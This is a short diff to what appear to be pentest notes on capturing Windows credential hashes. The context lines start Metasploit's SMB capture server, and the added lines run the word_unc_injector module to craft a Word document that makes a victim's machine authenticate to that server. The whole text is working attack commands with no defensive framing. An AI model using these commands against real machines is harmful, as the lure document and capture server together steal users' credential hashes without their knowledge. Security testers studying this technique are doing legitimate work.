@@ -19,3 +19,9 @@ set CAINPWFILE /path/to/store/cain_hashes.txt
 
 msfconsole -x "use auxiliary/server/capture/smb; set SRVHOST 192.168.178.136; set SRVPORT 445; set SMBDomain WORKGROUP; run"
 ```
+
+using unc injector:
+```bash
+msfconsole -q -x "use auxiliary/docx/word_unc_injector; set LHOST 192.168.1.103; run; exit"
+#then start server/capture/smb
+```
